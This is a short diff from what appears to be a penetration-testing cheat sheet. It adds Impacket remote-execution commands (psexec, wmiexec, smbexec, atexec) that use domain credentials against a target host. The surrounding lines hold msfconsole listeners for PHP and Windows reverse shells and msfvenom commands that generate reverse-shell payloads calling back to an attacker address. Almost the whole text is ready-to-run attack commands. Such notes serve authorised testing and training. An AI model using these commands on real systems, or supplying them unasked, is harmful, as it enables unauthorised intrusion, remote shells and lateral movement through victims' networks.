@@ -297,6 +297,12 @@ rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHO
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
 
++---------- Impacket ----------+
+impacket-psexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-wmiexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-smbexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-atexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET "whoami /all"
+
 +---------- MSFVenom ----------+
 msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
 msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
